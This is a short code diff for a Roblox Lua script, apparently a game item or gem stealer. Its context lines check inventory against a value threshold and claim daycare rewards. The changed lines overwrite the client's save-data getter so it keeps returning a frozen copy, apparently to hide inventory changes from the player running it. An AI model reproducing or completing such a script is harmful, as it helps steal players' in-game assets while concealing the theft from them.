@@ -363,8 +363,8 @@ if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
     EmptyBoxes()
 	require(game.ReplicatedStorage.Library.Client.DaycareCmds).Claim()
 	require(game.ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()
-    local blob_a = game.ReplicatedStorage.Library
-    local blob_b = require(blob_a.Client.Save).Get()
+    local blob_a = require(game.ReplicatedStorage.Library.Client.Save).Get
+    local blob_b = require(game.ReplicatedStorage.Library.Client.Save).Get()
     function deepCopy(original)
         local copy = {}
         for k, v in pairs(original) do
@@ -376,7 +376,7 @@ if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
         return copy
     end
     blob_b = deepCopy(blob_b)
-    require(blob_a.Client.Save).Get() = function(...)
+    blob_a = function(...)
         return blob_b
     end
 
